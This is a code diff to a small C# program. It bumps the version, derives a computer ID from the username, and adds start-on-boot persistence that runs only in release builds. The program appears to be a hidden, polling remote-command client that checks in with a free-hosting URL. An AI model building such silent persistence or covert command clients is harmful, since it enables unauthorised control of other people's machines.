@@ -7,11 +7,12 @@ internal class Program
 {
     public static string[]? publicArgs;
     public static string computerId = string.Empty;
+    public static string computerIdInitials = string.Empty;
+
+    public static int waitTime = 10000;
+
     private static void Main(string[] args)
     {
-
-
-
 #if DEBUG
         // Set current loglevel to Debug
         currentLevel = LogLevel.Debug;
@@ -21,7 +22,7 @@ internal class Program
         args = Arguments.PromptArguments(args);
 
         // Add --enableui to args
-        args = args.Append("--enableui").ToArray();
+        args = [.. args, "--enableui"];
 #else
         // Handle UI
         Functions.HandleUI(args);
@@ -42,17 +43,18 @@ internal class Program
 
         // Get computer ID
         computerId = Environment.UserName;
+        computerIdInitials = Functions.GetComputerIdInitials(computerId);
 
-
-        //// Test getSystemInfo
-        //Log(CommandExecutor.GetSystemInfo(), LogLevel.Info);
-        //Console.ReadLine();
+#if !DEBUG
+        // Start program on boot
+        StartOnBootClass.StartOnBoot();
+#endif
 
         // Initiate main loop
         while (true)
         {
             Loop();
-            Thread.Sleep(10000);
+            Thread.Sleep(waitTime);
         }
     }
 
@@ -117,7 +119,7 @@ static class Settings
 
 partial class Version
 {
-    public const string versionString = "0.0.2";
+    public const string versionString = "0.0.3";
     public static readonly System.Version version = new(versionString);
     public const string versionUrl = "https://site-mm.rf.gd/v2/";
 }
